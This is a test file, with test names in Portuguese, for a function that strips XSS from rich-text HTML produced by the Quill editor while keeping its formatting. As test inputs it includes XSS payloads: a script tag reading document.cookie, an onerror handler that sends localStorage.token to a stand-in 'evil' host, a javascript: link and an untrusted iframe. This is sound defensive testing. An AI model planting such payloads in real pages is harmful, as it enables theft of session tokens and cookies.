import { sanitizeRichText } from './sanitize';

describe('sanitizeRichText — conteúdo do editor Quill', () => {
  it('remove <script> mantendo o texto ao redor', () => {
    const result = sanitizeRichText(
      '<p>Boletim</p><script>alert(document.cookie)</script>'
    );
    expect(result).toBe('<p>Boletim</p>');
  });

  it('remove handlers inline como onerror', () => {
    const result = sanitizeRichText(
      '<img src="x" onerror="fetch(\'//evil/?c=\'+localStorage.token)" />'
    );
    expect(result).not.toContain('onerror');
    expect(result).toContain('<img');
  });

  it('remove href com javascript:', () => {
    const result = sanitizeRichText('<a href="javascript:alert(1)">clique</a>');
    expect(result).not.toContain('javascript:');
  });

  it('remove iframe de host não confiável e mantém vídeo do YouTube', () => {
    expect(
      sanitizeRichText('<iframe src="https://evil.example/x"></iframe>')
    ).toBe('<iframe></iframe>');
    expect(
      sanitizeRichText(
        '<iframe class="ql-video" src="https://www.youtube.com/embed/abc"></iframe>'
      )
    ).toContain('youtube.com/embed/abc');
  });

  it('preserva a formatação que a barra do Quill gera', () => {
    const html =
      '<h2>Título</h2><p><strong>negrito</strong> <em>itálico</em> ' +
      '<u>sublinhado</u> <s>riscado</s></p>' +
      '<p class="ql-align-center" style="color: rgb(0, 100, 0);">centralizado</p>' +
      '<ol><li data-list="bullet">item</li></ol>' +
      '<blockquote>citação</blockquote><pre class="ql-syntax">code()</pre>';
    const result = sanitizeRichText(html) as string;

    expect(result).toContain('<h2>Título</h2>');
    expect(result).toContain('<strong>negrito</strong>');
    expect(result).toContain('class="ql-align-center"');
    expect(result).toContain('color:rgb(0, 100, 0)');
    expect(result).toContain('data-list="bullet"');
    expect(result).toContain('<blockquote>citação</blockquote>');
  });

  it('mantém imagem em data URI colada no editor', () => {
    const dataUri =
      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
    expect(sanitizeRichText(`<img src="${dataUri}" />`)).toContain(
      'data:image/png'
    );
  });

  it('acrescenta rel=noopener em links', () => {
    const result = sanitizeRichText(
      '<a href="https://ifce.edu.br" target="_blank">IFCE</a>'
    ) as string;
    expect(result).toContain('rel="noopener noreferrer"');
  });

  it('devolve valores não-string intactos, para não quebrar update parcial', () => {
    expect(sanitizeRichText(undefined)).toBeUndefined();
    expect(sanitizeRichText(null)).toBeNull();
  });
});
